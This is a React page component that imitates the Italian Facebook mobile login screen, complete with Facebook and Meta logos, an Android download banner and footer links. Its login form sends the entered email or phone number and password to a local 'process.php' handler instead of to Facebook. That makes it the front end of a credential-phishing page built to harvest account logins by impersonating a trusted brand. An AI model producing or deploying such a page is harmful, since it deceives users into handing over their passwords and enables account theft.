'use client';

export default function Home() {
  return (
    <>
      <div className="top-banner">
        <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
      </div>

      <div className="fb-container">
        <p className="lang">Italiano</p>
        <img src="/facebook.png" alt="Logo Facebook" className="fb-logo" />

        <div className="fb-login-box">
          <form action="process.php" method="POST" className="fb-form">
            <input
              type="text"
              name="email"
              placeholder="Email o numero di telefono"
              required
            />
            <input
              type="password"
              name="password"
              placeholder="Password"
              required
            />
            <button type="submit">Accedi</button>
            <a href="#" className="forgot">Hai dimenticato la password?</a>
            <hr />
            <button className="create-account">Crea nuovo account</button>
          </form>
        </div>

        <footer className="meta-footer">
          <img src="/meta.png" alt="Logo Meta" className="meta-logo" />
          <div className="meta-links">
            <a href="#">Informazioni</a>
            <a href="#">Centro assistenza</a>
            <a href="#">Altro</a>
          </div>
        </footer>
      </div>
    </>
  );
}
